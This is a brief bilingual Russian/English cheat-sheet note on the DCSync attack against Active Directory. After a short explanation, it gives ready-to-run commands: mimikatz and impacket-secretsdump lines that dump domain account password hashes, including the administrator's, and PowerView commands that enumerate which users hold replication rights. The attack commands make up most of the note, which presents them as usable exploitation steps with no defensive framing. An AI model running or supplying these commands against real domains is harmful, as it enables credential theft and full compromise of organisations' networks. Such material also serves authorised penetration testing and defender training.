# DCSync

## What is this RU 

**DCSync** - это метод, используемый злоумышленниками для извлечения учетных записей домена из контроллера домена (DC) в среде Active Directory (AD).DCSync использует функцию Directory Replication Service Remote Protocol (DRS-RPC) для запроса и получения данных о учетных записях из контроллера домена, включая хэши паролей. Это позволяет злоумышленникам получить полный контроль над учетной записью, которую они могут использовать для доступа к ресурсам домена.

## What is this EN 

**DCSync** - is a method used by attackers to retrieve domain account credentials from a Domain Controller (DC) in an Active Directory (AD) environment. DCSync utilizes the Directory Replication Service Remote Protocol (DRS-RPC) to request and retrieve account data from the DC, including password hashes. This allows attackers to gain full control of an account, which they can use to access domain resources.

## Explotation

With mimikatz 
```
.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator" exit
```

With impacket
```
sudo impacket-secretsdump -outputfile userhashes -just-dc DOMAIN.LOCAL/administrator@10.10.10.10
```

Using Get-ObjectAcl to Check user Replication Rights
Get user object sid 
```
Get-DomainUser -Identity william  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

add sid to variable 
```
$sid= "object sid"
```

Get Object-ACL for user 
```
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

